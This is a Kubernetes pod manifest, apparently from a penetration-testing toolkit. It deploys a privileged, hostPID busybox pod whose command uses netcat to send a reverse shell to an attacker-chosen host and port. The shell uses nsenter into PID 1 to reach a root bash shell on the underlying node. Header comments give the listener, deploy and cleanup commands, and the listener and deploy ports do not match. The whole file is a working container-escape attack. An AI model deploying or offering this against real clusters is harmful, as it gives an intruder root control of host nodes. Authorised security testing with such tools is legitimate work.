###########################################################
## Set up Listener: nc -nvlp 3116
## Deploy: HOST="10.0.0.1" PORT="3112" envsubst < priv-and-hostpid-revshell-pod.yaml | kubectl apply -f -
## Remove: kubectl -n [namespace] delete priv-and-hostpid-revshell-pod
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: priv-and-hostpid-revshell-pod
  labels: 
    app: pentest
spec:
  hostPID: true
  containers:
  - name: priv-and-hostpid-revshell-pod
    image: busybox
    command: [ "/bin/nc", "$HOST", "$PORT", "-e", "/bin/nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
    securityContext:
      privileged: true
  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
  restartPolicy: Always